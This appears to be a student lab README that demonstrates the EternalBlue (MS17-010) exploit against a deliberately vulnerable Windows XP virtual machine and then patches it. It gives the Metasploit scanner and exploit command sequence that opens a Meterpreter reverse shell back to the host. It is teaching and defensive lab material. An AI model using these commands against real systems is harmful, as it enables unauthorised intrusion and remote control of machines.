# EthernalBlue
Cybersecurity Projects Portfolio | Penetration Testing | Vulnerability Assessments | Threat Research
This project explains how the EternalBlue exploit (MS17-010) works


███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗     ██████╗ ██╗     ██╗   ██╗███████╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔══██╗██║     ██║   ██║██╔════╝
█████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║     ██████╔╝██║     ██║   ██║█████╗  
██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║     ██╔══██╗██║     ██║   ██║██╔══╝  
███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗██████╔╝███████╗╚██████╔╝███████╗
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
                                                                                            
██████╗ ███████╗███╗   ███╗ ██████╗                                                         
██╔══██╗██╔════╝████╗ ████║██╔═══██╗                                                        
██║  ██║█████╗  ██╔████╔██║██║   ██║                                                        
██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║                                                        
██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                                                        
╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                                         
                                                                                                                                       
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                                                                                                                                                                                                                                                      
“EthernalBlue” is an exploit created by the NSA as a cybersecurity tool. The official name of the exploit given by Microsoft is MS17-010. The exploit is not specific to windows devices but affects anything that works on the Microsoft SMBV1 Server Protocol. This README file contains instructions on how to demonstrate the EternalBlue Exploit on a test machine.


|** Links to Required Files **|

Download and install VirtualBox following the instructions given at https://www.virtualbox.org/wiki/Downloads.

Download the OVA file from https://swanseauniversity-my.sharepoint.com/:u:/g/personal/2153389_swansea_ac_uk/EYKnpRVgpGRJsMm8aNzDJVIBLi8GiT-lxJew0tVsdF2Oeg?e=UriXBA

The patch can be downloaded from https://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598. It has already been downloaded and placed in the VM for this demo.

Place the files in as easily accessible directory.



|** VM Installation **|

Using the command virtualbox in a terminal.



|** In the virtualbox Window **|

Click on Tools
Click on Import (Toolbar to the right)
Select the ova file that was downloaded earlier, using the file icon at the right of the input box.
Click the Enter Key to go further.
Please wait for the Virtual Machine to load into memory; it might take a sec.



|** VM Network Setup **|

Once the VM has completed loading, click on the newly installed VM and Select Settings.
Once in Settings, Select Network.
Select Adapter 1 and Enable the Same.
Click on the dropdown and select "Bridged Adapter".
Now click Start to run the VM. 
Select the User "Very Vulnerable Comp".



[***From here on, Your Computer will be called the HOST***]

Now we need to set up the network so that both the HOST and the VM are on the same network.

On the HOST, open a Terminal (Alt + T).
Run the command "ifconfig" and note the Host IP and SubnetMask(netmask).

On the VM, open a Run dialog (Windows Key + R). 
Enter ncpa.cpl, which will open the Network connections manager.
Right-click on "Local Area Connection" and select Properties.
Click on Internet Protocol (TCP/IP) and select Properties.
Select the "Use the following IP address" option. You will see a prompt for the IP along with the Subnet mask.
Insert the IP of your host, making sure to set the last octet to a different number within the range [0-255]
Set the Subnet mask as it is shown on the host.
Continue clicking OK till the dialog box closes.
Optional: To make sure the IP has been set, Open a command prompt and run the ipconfig command on the VM.



|** Testing if VM is Vulnerable **|
On the Host, Open a Terminal and run msfconsole.
Once it is open, run the sequence of commands : use auxiliary/scanner/smb/smb_ms17_010 -> set RHOSTS  -> exploit
It should give an output similar to:-
//***********
-Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
-Scanned 1 of 1 hosts (100% complete)
-The target is vulnerable.
***********//

Which tells us that the VM is Vulnerable to EternalBlue, therefore we now run the exploit.
[***Optional: If the HOST has UFW Enabled, Open a port using "sudo ufw allow 4242"***]

|** Running the Exploit **|
On the Metasploit console, run these commands in a sequence: use exploit/windows/smb/ms17_010_psexec -> set RHOSTS <IP of the VM> -> set LHOST <Host IP> -> exploit.
This will now provide us with an output similar to:
//************
--Meterpreter session 1 opened (137.44.123.158:4444 -> 137.44.122.100:1057 ) at 2022-03-16 14:11:46 +0000
--meterpreter >
************//

We now a shell running on the VM. To make sure, you can run the command: cd C://"Documents and Settings"/"Very Vulnerable Comp"/Desktop -> edit pwn
Save and Exit (Click Esc -> (Shift + :) -> wq -> Enter).
Run the command "exit" in the meterpreter shell to close it.
On the VM you should now see the pwn file on the desktop.



|** Patching the Vulnerablilty **|
On the desktop there is an executable provided with the name "windowsxp-Patch".
Run the executable and Install the patch.
Once the patch is installed the machine will restart, we can move on to the Host.

On the Host open the Metasploit console from earlier. 
Run the sequence of commands : use auxiliary/scanner/smb/smb_ms17_010 -> set RHOSTS <IP of the VM> -> exploit
You should be able to see an output like this, 
//*************
--Host does NOT appear vulnerable.
*************//
We can further confirm this by running the follwing sequence : use exploit/windows/smb/ms17_010_psexec -> set RHOSTS <IP of the VM> -> set LHOST <Host IP> -> exploit.
This will provide an output like,
//*************
<---------------- | Entering Danger Zone | ---------------->
[*] 137.44.122.100:445 - 	[*] Preparing dynamite...
[*] 137.44.122.100:445 - 		Trying stick 1 (x86)...Miss
[*] 137.44.122.100:445 - <---------------- | Leaving Danger Zone | ---------------->
[-] 137.44.122.100:445 - Unable to control groom transaction
*************//

Therefore we have verified that the VM is no longer vulnerable to the exploit.



